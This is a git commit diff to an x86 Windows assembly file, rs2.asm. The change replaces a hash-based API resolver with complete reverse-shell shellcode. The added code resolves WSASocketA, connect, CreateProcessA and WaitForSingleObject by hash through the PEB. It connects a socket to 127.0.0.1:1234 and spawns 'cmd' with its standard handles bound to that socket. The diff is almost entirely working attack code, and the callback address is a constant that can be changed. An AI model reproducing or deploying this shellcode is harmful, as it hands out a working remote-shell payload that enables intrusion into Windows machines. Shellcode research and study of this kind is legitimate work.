549efc1c4d9f1ae976a4e5d979ef8752476cf6f8
Odzhan <odzhan@protonmail.com>
2017-11-15 23:58:16 +0000

    upd

--- rs2.asm
+++ rs2.asm
@@ -27,6 +27,7 @@
 ;  ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
 ;  POSSIBILITY OF SUCH DAMAGE.
 ;
+
     bits   32
 
 struc pushad_t
@@ -41,76 +42,138 @@ struc pushad_t
   .size:
 endstruc
 
-; VOID invoke_api(DWORD api_hash, LPVOID api_parameters[]);
-invoke_api:
-    pushad
-    xor    eax, eax
-    mov    eax, [fs:eax+30h]  ; eax = (PPEB) __readfsdword(0x30);
-    mov    eax, [eax+0ch]  ; eax = (PPEB_LDR_DATA)peb->Ldr
-    mov    edi, [eax+0ch]  ; edi = ldr->InLoadOrderModuleList.Flink
-    jmp    get_base
-next_module:    
-    mov    edi, [edi]     ; edi = dte->InLoadOrderLinks.Flink
-get_base:
-    mov    ebx, [edi+18h] ; ebx = dte->DllBase
-    ; eax = IMAGE_DOS_HEADER.e_lfanew
-    mov    eax, [ebx+3ch]
-    ; ecx = IMAGE_DATA_DIRECTORY.VirtualAddress
-    mov    ecx, [ebx+eax+78h]
-    jecxz  next_module
-    ; esi = api_hash(IMAGE_EXPORT_DIRECTORY.Name)
-    mov    esi, [ebx+ecx+0ch]
-    add    esi, ebx
-    xor    eax, eax
-    cdq
-hash_dll:
-    lodsb
-    or     al, 20h  ; convert to lowercase 
-    add    edx, eax ;  h += (*s++ | 0x20)
-    ror    edx, 13  ;  h = ROTR32(h, 13) 
-    dec    eax      ; while (*s)
-    jns    hash_dll    
-    mov    ebp, edx
-    
-    ; esi = offset IMAGE_EXPORT_DIRECTORY.NumberOfNames 
-    lea    esi, [ebx+ecx+18h]
-    lodsd
-    xchg   eax, ecx
-    jecxz  next_module     ; skip if no names
-    push   edi    
-    ; save IMAGE_EXPORT_DIRECTORY.AddressOfFunctions     
-    lodsd
-    add    eax, ebx
-    push   eax             ; save 
-    ; edx = IMAGE_EXPORT_DIRECTORY.AddressOfNames
-    lodsd
-    lea    edx, [eax+ebx]
-    ; save IMAGE_EXPORT_DIRECTORY.AddressOfNameOrdinals
-    lodsd
-    add    eax, ebx
-    push   eax
-get_name:
-    mov    esi, [edx+4*ecx-4] ; eax = RVA of API string
-    add    esi, ebx           ; eax = RVA2VA(eax, ebx)
-    xor    edi, edi
-hash_name:    
-    movzx  eax, byte[esi]
-    inc    esi 
-    add    edi, eax
-    ror    edi, 13
-    dec    eax
-    jns    hash_name
-    add    edi, ebp           ; add hash of DLL string
+      bits   32
 
-    cmp    edi, [esp+_ecx+8]  ; hashes match?
-    loopne get_name           ; --ecx && eax != hash
-    pop    esi                ; esi = AddressOfFunctions
-    pop    edx                ; edx = AddressOfNameOrdinals
-    jne    next_module        ; get next DLL
-    pop    edi
-    movzx  eax, word [edx+2*ecx] ; eax = AddressOfNameOrdinals[eax]
-    add    ebx, [esi+4*eax]      ; ecx = base + AddressOfFunctions[eax]
-    mov    [esp+_eax], ebx
-    popad                        ; restore all
-    jmp    ecx                   ; jmp into api  
+      xor    eax, eax
+      call   init_api_disp      ; load the API dispatcher
+api_hash:      
+      dd     0xDF6D65D1         ; WS2_32.dll + WSASocketA    
+      db     'cmd',0h    
+      dd     0D2040002h         ; sa.sin_port = htons(1234)
+      dd     00100007Fh         ; sa.sin_addr = inet_addr("127.0.0.1")
+      dd     0xA324AC0C         ; WS2_32.dll + connect
+      dd     0x611AD39B         ; KERNEL32.dll + CreateProcessA
+      dd     0x607F058C         ; KERNEL32.dll + WaitForSingleObject
+api_disp: 
+      lodsd                     ; eax = hash to find
+      pushad                    ; saves api hash on stack
+      xor    eax, eax
+      mov    eax, [fs:eax+30h]  ; eax = (PPEB) __readfsdword(0x30);
+      mov    eax, [eax+0ch]     ; eax = (PPEB_LDR_DATA)peb->Ldr
+      mov    edi, [eax+0ch]     ; edi = ldr->InLoadOrderModuleList.Flink
+      jmp    get_dll
+next_dll:    
+      mov    edi, [edi]         ; edi = dte->InLoadOrderLinks.Flink
+get_dll:
+      mov    ebx, [edi+18h]     ; ebx = dte->DllBase
+      ; eax = IMAGE_DOS_HEADER.e_lfanew
+      mov    eax, [ebx+3ch]
+      ; ecx = IMAGE_DATA_DIRECTORY.VirtualAddress
+      mov    ecx, [ebx+eax+78h]
+      jecxz  next_dll
+      ; esi = hash_dll(IMAGE_EXPORT_DIRECTORY.Name)
+      mov    esi, [ebx+ecx+0ch]
+      add    esi, ebx
+      xor    eax, eax
+      cdq
+hash_dll:
+      lodsb
+      add    edx, eax ;  h += *s++
+      rol    edx, 13  ;  h = ROTL32(h, 13) 
+      dec    eax
+      jns    hash_dll
+      mov    ebp, edx
+      
+      ; esi = offset IMAGE_EXPORT_DIRECTORY.NumberOfNames 
+      lea    esi, [ebx+ecx+18h]
+      lodsd
+      xchg   eax, ecx
+      jecxz  next_dll        ; skip if no names
+      push   edi             ; save edi
+      ; save IMAGE_EXPORT_DIRECTORY.AddressOfFunctions     
+      lodsd
+      add    eax, ebx        ; eax = RVA2VA(eax, ebx)
+      push   eax             ; save address of functions
+      ; edi = IMAGE_EXPORT_DIRECTORY.AddressOfNames
+      lodsd
+      add    eax, ebx        ; eax = RVA2VA(eax, ebx)
+      xchg   eax, edi        ; swap(eax, edi)
+      ; save IMAGE_EXPORT_DIRECTORY.AddressOfNameOrdinals
+      lodsd
+      add    eax, ebx        ; eax = RVA(eax, ebx)
+      push   eax             ; save address of name ordinals
+get_name:
+      mov    esi, [edi+4*ecx-4] ; esi = RVA of API string
+      add    esi, ebx           ; esi = RVA2VA(esi, ebx)
+      xor    eax, eax           ; zero eax
+      cdq                       ; h = 0
+hash_name:    
+      lodsb
+      add    edx, eax
+      rol    edx, 13
+      dec    eax
+      jns    hash_name
+      add    edx, ebp           ; add hash of DLL string  
+      cmp    edx, [esp+_eax+12] ; hashes match?
+      loopne get_name           ; --ecx && edx != hash
+      pop    edx                ; edx = AddressOfNameOrdinals
+      pop    esi                ; esi = AddressOfFunctions
+      pop    edi                ; restore DLL entry
+      jne    next_dll           ; get next DLL        
+      movzx  eax, word [edx+2*ecx] ; eax = AddressOfNameOrdinals[eax]
+      add    ebx, [esi+4*eax]      ; ecx = base + AddressOfFunctions[eax]
+      mov    [esp+_eax], ebx
+      popad                        ; restore all
+      jmp    eax                   ; jmp to api address
     
+init_api_disp:        
+      pop    esi                   ; esi = api parameters
+      lea    ebp, [esi+(api_disp - api_hash)]        ; ebp = api dispatcher
+      
+      ; edi = alloc(124);    
+      push   124
+      pop    ecx
+      sub	   esp, ecx
+      mov	   edi, esp
+      rep    stosb
+
+      ; WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_IP, NULL, 0, 0);
+      push	 1
+      push	 2
+      call	 ebp
+
+      ; CreateProcess(NULL, "cmd", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
+      mov    ebx, esp
+      lea    edi, [ebx+38h] ; edi = offset STARTUPINFO.hStdInput
+      inc    dword[ebx+2dh] ; si.dwFlags = STARTF_USESTDHANDLES
+      stosd                 ; si.hStdInput  = s;
+      stosd                 ; si.hStdOutput = s;
+      stosd                 ; si.hStdError  = s;
+      cdq      
+      push	 edi            ; lpProcessInformation = &pi
+      push	 ebx            ; lpStartupInfo = &pi      
+      push	 edx            ; lpCurrentDirectory = NULL
+      push	 edx            ; lpEnvironment = NULL
+      push	 edx            ; dwCreationFlags = 0
+      push	 eax            ; bInheritHandles = TRUE
+      push	 edx            ; lpThreadAttributes = NULL
+      push	 edx            ; lpProcessAttributes = NULL
+      push	 esi            ; lpCommandLine = "cmd", 0
+      push	 edx            ; lpApplicationName = NULL
+      xchg   ebx, eax
+      lodsd
+      ; connect(s, &sa, sizeof(sa));
+      push	 10h            ; sizeof(sa)
+      push	 esi            ; &sa
+      push	 ebx            ; s
+      lodsd                 ; skip &sa
+      lodsd
+      call	 ebp            ; connect
+      call	 ebp            ; CreateProcessA
+
+      ; WaitForSingleObject(pi.hProcess, INFINITE);
+      push	 -1
+      push	 dword [edi]
+      call	 ebp   
+      
+      ; crash...
